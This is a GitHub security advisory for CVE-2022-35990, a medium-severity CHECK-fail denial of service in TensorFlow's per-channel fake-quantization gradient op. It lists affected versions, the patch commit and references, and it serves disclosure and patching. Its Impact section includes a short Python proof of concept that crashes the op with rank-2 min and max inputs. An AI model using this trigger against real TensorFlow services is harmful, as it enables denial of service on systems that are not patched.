# [M]  TensorFlow vulnerable to `CHECK` fail in `FakeQuantWithMinMaxVarsPerChannelGradient`

## Summary
Severity: Medium
Advisory: GHSA-h7ff-cfc9-wmmh
CVE: CVE-2022-35990
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-h7ff-cfc9-wmmh
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When `tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient` receives input `min` or `max` of rank other than 1, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_2=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_3=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_4=8
arg_5=False
arg_6=None
tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient(gradients=arg_0, 
            inputs=arg_1, min=arg_2,  max=arg_3, num_bits=arg_4, 
            narrow_range=arg_5, name=arg_6)
```

### Patches
We have patched the issue in GitHub commit [f3cf67ac5705f4f04721d15e485e192bb319feed](https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 
 - 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
 - Neophytos Christou, Secure Systems Labs, Brown University

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h7ff-cfc9-wmmh
- https://nvd.nist.gov/vuln/detail/CVE-2022-35990
- https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
